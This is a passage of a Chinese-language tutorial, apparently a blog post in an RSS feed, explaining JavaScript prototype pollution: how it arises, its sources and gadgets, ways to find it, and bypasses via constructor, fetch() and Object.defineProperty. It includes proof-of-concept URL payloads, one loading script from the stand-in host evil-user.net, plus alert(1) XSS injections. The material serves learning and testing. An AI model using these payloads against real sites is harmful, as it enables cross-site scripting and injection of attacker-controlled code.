+<h3 id="修改prototype">修改prototype</h3>
+<p>只需要正常的修改即可，比如给<code>String.prototype</code>添加一个方法</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nb">String</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">removeWhitespace</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// remove leading and trailing whitespace
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">searchTerm</span> <span class="o">=</span> <span class="s2">&#34;  example &#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">searchTerm</span><span class="p">.</span><span class="nx">removeWhitespace</span><span class="p">();</span> <span class="c1">// &#34;example&#34;
+</span></span></span></code></pre></div></div>
+<p>字符串都继承了这个prototype，所以都能调用这个方法。</p>
+<h2 id="漏洞产生">漏洞产生</h2>
+<p>JavaScript函数递归地将包含可控properties的对象合并到现有对象中的时候，就有可能出现prototype污染漏洞。攻击者可以通过<code>__proto__</code>或者其他任意嵌套的properties去注入。</p>
+<p>由于<code>__proto__</code>的含义，合并操作可以将properties分配给对象的prototype而不是它本身。</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<ul>
+<li>污染源：可以去污染的全局prototype</li>
+<li>一个支持任意代码执行的方法或者DOM元素</li>
+<li>gadget：
+<ul>
+<li>它被不安全地使用</li>
+<li>继承了攻击者污染的prototype，被修改的properties不能在gadget上已有定义。一些网站会让对象的prototype为null以确保它没有继承任何东西。</li>
+</ul>
+</li>
+</ul>
+<h3 id="污染源">污染源</h3>
+<p>污染源允许攻击者输入添加properties到全局prototype，常见污染源如下：</p>
+<ul>
+<li>URL</li>
+<li>JSON输入</li>
+<li>Web信息</li>
+</ul>
+<h4 id="基于url的prototype污染">基于URL的prototype污染</h4>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">vulnerable</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="err">?</span><span class="n">__proto__</span><span class="p">[</span><span class="n">evilProperty</span><span class="p">]</span><span class="o">=</span><span class="n">payload</span></span></span></code></pre></div></div>
+<p>当将查询字符串分解成键值对时，<code>__proto__</code>可能被解释为任意字符串，合并到对象时不会合并到对象本身，而是分配给prototype，语句类似这样：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">targetObject</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">evilProperty</span> <span class="o">=</span> <span class="s2">&#34;payload&#34;</span><span class="p">;</span></span></span></code></pre></div></div>
+<h4 id="基于json-输入的prototype污染">基于JSON 输入的prototype污染</h4>
+<p>用户可控的对象通常使用<code>JSON.parse()</code>方法派生自JSON字符串。<code>JSON.parse()</code>方法将JSON对象的任何key视作字符串，包括<code>__proto__</code>这样的。
+假设攻击者通过Web信息注入恶意的JSON：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__proto__&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;evilProperty&#34;</span><span class="p">:</span> <span class="s2">&#34;payload&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>再通过<code>JSON.parse()</code>方法将它转换为JavaScript对象，生成的对象就会具有<code>__proto__</code>这样的property。</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">objectLiteral</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">__proto__</span><span class="o">:</span> <span class="p">{</span> <span class="nx">evilProperty</span><span class="o">:</span> <span class="s2">&#34;payload&#34;</span> <span class="p">}</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">objectFromJson</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="s1">&#39;{&#34;__proto__&#34;: {&#34;evilProperty&#34;: &#34;payload&#34;}}&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">objectLiteral</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="s2">&#34;__proto__&#34;</span><span class="p">);</span> <span class="c1">// false
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">objectFromJson</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="s2">&#34;__proto__&#34;</span><span class="p">);</span> <span class="c1">// true
+</span></span></span></code></pre></div></div>
+<p>如果这样的对象与现有对象合并，并且没有进行适当的过滤，就可以导致prototype污染。</p>
+<h3 id="例子">例子</h3>
+<p>很多JavaScript库允许开发者给对象使用不用的配置选项。库代码检查开发人员是否显示地向对象添加属性，如果添加则会相应地调整配置。如果特定选项的property不存在就会使用预定义的默认选项。</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">transport_url</span> <span class="o">=</span> <span class="nx">config</span><span class="p">.</span><span class="nx">transport_url</span> <span class="o">||</span> <span class="nx">defaults</span><span class="p">.</span><span class="nx">transport_url</span><span class="p">;</span></span></span></code></pre></div></div>
+<p>假设库代码使用<code>transport_url</code>向页面添加一个脚本引用</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;script&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">script</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="sb">`</span><span class="si">${</span><span class="nx">transport_url</span><span class="si">}</span><span class="sb">/example.js`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span></span></span></code></pre></div></div>
+<p>如果网站开发者为由为<code>config</code>对象设置<code>transport_url</code>property的话，这就是一个gadget。攻击者可以利用自己的<code>transport_url</code>污染全局<code>Object.prototype</code>，这将被<code>config</code>对象继承。脚本的<code>src</code>也被设置为攻击者指定的域名。</p>
+<p>如果这个prototype可以被查询参数污染，受害者只需点击下方链接即可从攻击者指定的域中导入一个JS文件</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net</span></span></code></pre></div></div>
+<p>攻击者可以直接诶嵌入XSS的payload，例如</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//</span></span></code></pre></div></div>
+<p>上述URL后面的<code>//</code>时为了绕过<code>/example.js</code>后缀</p>
+<h2 id="发现漏洞">发现漏洞</h2>
+<h3 id="寻找污染点">寻找污染点</h3>
+<h4 id="手工挖掘">手工挖掘</h4>
+<p>手工挖掘就是试错，尝试采用不同的方法向<code>Object.prototype</code>添加任意的property。</p>
+<p>1 .尝试去在一些地方注入任意的property，比如：</p>
+<ul>
+<li>vulnerable-website.com/?__proto__[foo]=bar</li>
+</ul>
+<p>2 .在浏览器console检查<code>Object.prototype</code>以确认这个property是否成功污染了它
+3 .如果property没有被添加到全局prototype中，尝试不同的方法，比如用<code>.</code>而不是<code>[]</code>：</p>
+<ul>
+<li>vulnerable-website.com/?__proto__.foo=bar</li>
+</ul>
+<h4 id="使用-dom-invader">使用 DOM Invader</h4>
+<p>用于代替手工挖掘</p>
+<h3 id="寻找gadget">寻找gadget</h3>
+<h4 id="手工挖掘-1">手工挖掘</h4>
+<ol>
+<li>观察源代码并确认被使用的任何properties</li>
+<li>拦截包含要测试的JavaScript的响应数据包</li>
+<li>在脚本开头添加一个<code>debuger</code>，然后转发剩余的数据包</li>
+<li>打开脚本被载入的页面，添加的<code>debuger</code>会暂停脚本的执行</li>
+<li>此时在浏览器console输入以下命令：</li>
+</ol>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">,</span> <span class="s2">&#34;YOUR-PROPERTY&#34;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">get</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;polluted&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span></span></span></code></pre></div></div>
+<p>这个property被记录到全局<code>Object.prototype</code>。每次访问这个property的时候，浏览器都会将堆栈跟踪记录到console</p>
+<ol>
+<li>继续执行脚本并且监视console。只要堆栈真的被记录了就可以确定这个property被访问了</li>
+<li>展开堆栈跟踪并且使用它提供的链接跳转到正在读取property的代码所在的行</li>
+<li>使用浏览器调试，逐步执行以查看这个property是否被传递给sink，比如<code>innerHTML</code>或<code>eval()</code></li>
+</ol>
+<h4 id="使用dom-invader">使用DOM Invader</h4>
+<p>手工寻找gadget在目前网站通常依赖于大量第三方库的情况下是一个艰巨的任务。</p>
+<h2 id="通过constructor实现prototype污染">通过constructor实现prototype污染</h2>
+<p>上面阐述的经典的prototype污染，一个常见的防御方法就是在合并用户可控对象之前去掉任何带有<code>__proto__</code>的property。事实上有其他方法在不依赖<code>__proto__</code>字符串的情况下引用<code>Object.prototype</code></p>
+<p>除非prototype为null，否则每个JS对象都有一个名为<code>constructor</code>的property，其中包含对创建它的构造函数的引用。下面两条语句就是调用<code>Object</code>构造函数：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">myObjectLiteral</span> <span class="o">=</span> <span class="p">{};</span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">myObject</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Object</span><span class="p">();</span></span></span></code></pre></div></div>
+<p>也可以直接调用<code>construcotr</code>：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">myObjectLiteral</span><span class="p">.</span><span class="nx">constructor</span><span class="p">;</span> <span class="c1">// function Object(){...}
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">myObject</span><span class="p">.</span><span class="nx">constructor</span><span class="p">;</span> <span class="c1">// function Object(){...}
+</span></span></span></code></pre></div></div>
+<p>函数实际上也是对象。每个构造函数都有一个叫做<code>prototype</code>的porperty，它指向了被分配给由这个构造函数创建出的任何对象的prototype，所以也可以通过这个来访问对象的prototype</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">myObject</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">;</span> <span class="c1">// Object.prototype
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">myString</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">;</span> <span class="c1">// String.prototype
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">myArray</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">;</span> <span class="c1">// Array.prototype
+</span></span></span></code></pre></div></div>
+<p>由此可见，<code>myObject.constructor.prototype</code>等价于<code>myObject.__proto__</code>，攻击的时候就有一个可供替代的选项</p>
+<h2 id="通过浏览器api实现prototype污染">通过浏览器API实现prototype污染</h2>
+<h3 id="fetch">fetch()</h3>
+<p><code>fetch</code>API能够简单地发送HTTP请求，<code>fetch()</code>函数总共接收两个参数：</p>
+<ol>
+<li>URL</li>
+<li>一个可以指定请求数据包一些参数的对象</li>
+</ol>
+<p>下面这个例子展示了如何通过这个函数发送一个POST请求：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;https://normal-website.com/my-account/change-email&#34;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">method</span><span class="o">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">body</span><span class="o">:</span> <span class="s2">&#34;user=carlos&amp;email=carlos%40ginandjuice.shop&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span></span></span></code></pre></div></div>
+<p>上述代码定义了<code>method</code>和<code>boby</code>两个properties，但还有一些prpperities没有定义。攻击者可以使用自己的<code>headers</code>property污染<code>Object.prototype</code>，然后被传递到<code>fetch()</code>函数的对象继承，随即发送请求。</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;/my-products.json&#34;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">method</span><span class="o">:</span> <span class="s2">&#34;GET&#34;</span> <span class="p">})</span>
+</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span> <span class="p">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">data</span><span class="p">[</span><span class="s2">&#34;x-username&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">message</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">&#34;.message&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">username</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">message</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="sb">`My products. Logged in as &lt;b&gt;</span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">&lt;/b&gt;`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">productList</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">&#34;ul.products&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">product</span> <span class="k">of</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kd">let</span> <span class="nx">product</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;li&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">product</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="nx">product</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">productList</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="nx">product</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">})</span>
+</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">);</span></span></span></code></pre></div></div>
+<p>攻击者可以通过<code>x-username</code>headers污染<code>Object.prototype</code>：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?__proto__[headers][x-username]=&lt;img/src/onerror=alert(1)&gt;</span></span></code></pre></div></div>
+<h3 id="objectdefineproperty">Object.defineProperty()</h3>
+<p>开发者可以使用<code>Object.defineProperty()</code>来使得对象有不可被修改的property：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">vulnerableObject</span><span class="p">,</span> <span class="s2">&#34;gadgetProperty&#34;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">configurable</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">writable</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span></span></span></code></pre></div></div>
+<p>上述代码看上去可以是一个合理的写法，实际上是有缺陷的。就像上边的<code>fetch()</code>函数一样，<code>Object.defineProperty()</code>也接收一个对象。开发者可以使用这个对象为正在定义的属性赋初值，不过如果只是为了防犯这个攻击，开发者可能不会设置一个初始值。</p>
+<p>攻击者可以通过恶意<code>value</code>这个property污染<code>Object.prototype</code>绕过这个防御。如果它被传递给<code>Object.defineProtoperty()</code>的对象继承了，用户可控的值可能最终就被分配给gadget property。</p>]]></description>
+</item>
+</channel>
+</rss>
